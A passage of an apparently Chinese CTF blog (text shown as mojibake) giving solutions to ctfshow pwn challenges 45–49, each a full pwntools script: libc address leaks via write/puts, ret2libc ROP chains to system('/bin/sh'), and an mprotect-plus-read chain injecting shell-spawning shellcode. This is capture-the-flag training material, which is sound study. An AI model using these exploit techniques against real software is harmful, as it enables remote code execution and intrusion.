</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">gets</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn45">pwn45
</h2><p>Ê≤°ÊúâsystemÔºå‰πüÊ≤°Êúâ‚Äúbin/sh‚Äù</p>
<ul>
<li>
<p>Ê≥ÑÈú≤writeÂáΩÊï∞Âú∞ÂùÄËé∑Âèñ libc ÁâàÊú¨</p>
</li>
<li>
<p>Ëé∑Âèñ system Âú∞ÂùÄ‰∏é /bin/sh ÁöÑÂú∞ÂùÄ</p>
</li>
<li>
<p>ÂÜçÊ¨°ÊâßË°åÊ∫êÁ®ãÂ∫è</p>
</li>
<li>
<p>Ëß¶ÂèëÊ†àÊ∫¢Âá∫ÊâßË°å system(‚Äò/bin/sh‚Äô)</p>
</li>
</ul>
<p><img src="/p/ctfshow-pwn/image-20250310232614256.png"
	width="1270"
	height="343"
	srcset="/p/ctfshow-pwn/image-20250310232614256_hu_54b9be5bbbc257ed.png 480w, /p/ctfshow-pwn/image-20250310232614256_hu_d97b040eeba0fb2b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="370"
		data-flex-basis="888px"
	
></p>
<p>ÔºàÂèØ‰ª•Âà©Áî®putsÂáΩÊï∞Ôºâ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">LibcSearcher</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28149</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6b</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="o">=</span><span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xf7</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl"><span class="c1">#writeÂú®gotË°®ÁöÑÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hex</span><span class="p">(</span><span class="n">write</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">,</span><span class="n">write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span><span class="o">=</span><span class="n">write</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6b</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn47">pwn47
</h2><p><img src="/p/ctfshow-pwn/image-20250312133853059.png"
	width="939"
	height="535"
	srcset="/p/ctfshow-pwn/image-20250312133853059_hu_51ec2a6e7d622fd4.png 480w, /p/ctfshow-pwn/image-20250312133853059_hu_2cbbee5f4234a91e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="175"
		data-flex-basis="421px"
	
></p>
<p>‰∏ÄÁúãÁõ¥Êé•ÊâìÂç∞Âú∞ÂùÄÔºåÊâãÂä®ÂÜôËá™Âä®ËÑöÊú¨ÈÉΩË°å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">LibcSearcher</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ËÆæÁΩÆÁõÆÊ†áÁ®ãÂ∫è</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Êú¨Âú∞Ë∞ÉËØïÊàñËøúÁ®ãËøûÊé•</span>
</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#39;./vulnerable_binary&#39;)  # Êú¨Âú∞</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28266</span><span class="p">)</span>  <span class="c1"># ËøúÁ®ã</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;pwn6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;puts: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">puts</span> <span class="o">=</span> <span class="n">eval</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="n">True</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x0804B028</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">,</span> <span class="n">puts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x9C</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn48">pwn48
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">LibcSearcher</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28103</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;pwn8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;O.o?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6b</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">puts</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xf7</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hex</span><span class="p">(</span><span class="n">puts</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span><span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">,</span><span class="n">puts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6b</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊÄªÁÆóÊòéÁôΩ‰∫ÜpayloaÁöÑÂå∫Âà´‰∫Ü</p>
<p>payload =  cyclic(0x9C+4)+p32(puts_plt)+p32(0)+p32(puts_got)+p32(4)</p>
<p>ËøîÂõûÂú∞ÂùÄ0Ôºå‰ª§Á®ãÂ∫èÂ¥©Ê∫ÉÔºåÊ≥ÑÈú≤putsÂú∞ÂùÄÂêéÁ®ãÂ∫èÂ¥©Ê∫É</p>
<p>payload =  cyclic(0x9C+4)+p32(puts_plt)+p32(main)+p32(puts_got)</p>
<p>ËøîÂõûmainÂáΩÊï∞ÔºåÁ®ãÂ∫èÁªßÁª≠ËøêË°å</p>
<h2 id="pwn49">pwn49
</h2><p>mprotectÂáΩÊï∞</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">LibcSearcher</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28263</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;pwn49&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">mprotect</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;mprotect&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="o">=</span><span class="mh">0x0806BEE0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pop_ebx_esi_ebp_ret</span> <span class="o">=</span><span class="mh">0x080a019b</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">addr</span><span class="o">=</span><span class="mh">0x080DA000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">size</span><span class="o">=</span><span class="mh">0x2000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">proc</span><span class="o">=</span><span class="mh">0x7</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x12</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mprotect</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_esi_ebp_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">proc</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">read</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_esi_ebp_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="c1">#Áî®‰∫éÁîüÊàê‰∏Ä‰∏™ÊâßË°å/bin/sh</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn/image-20250312193736349.png"
	width="1347"
	height="183"
	srcset="/p/ctfshow-pwn/image-20250312193736349_hu_e8364d2fc7a64f60.png 480w, /p/ctfshow-pwn/image-20250312193736349_hu_b42269d9d931d007.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="736"
		data-flex-basis="1766px"
	
></p>

</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            ÊúÄÂêéÊõ¥Êñ∞‰∫é Mar 23, 2025 01:18 &#43;0800
        </span>
    </section></footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.body, {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ],
            ignoredClasses: ["gist"]
        });})
</script>
    
</article>

    

    

     
    
        
    <script src="https://utteranc.es/client.js" 
        repo="Frederick2313072/utterances-comments"
        issue-term="pathname"
        
        crossorigin="anonymous"
        async
        >
</script>

<style>
    .utterances {
        max-width: unset;
    }
</style>

<script>
    let utterancesLoaded = false;

    function setUtterancesTheme(theme) {
        let utterances = document.querySelector('.utterances iframe');
        if (utterances) {
            utterances.contentWindow.postMessage(
                {
                    type: 'set-theme',
                    theme: `github-${theme}`
                },
                'https://utteranc.es'
            );
        }
    }

    addEventListener('message', event => {
        if (event.origin !== 'https://utteranc.es') return;

        
        utterancesLoaded = true;
        setUtterancesTheme(document.documentElement.dataset.scheme)
    });

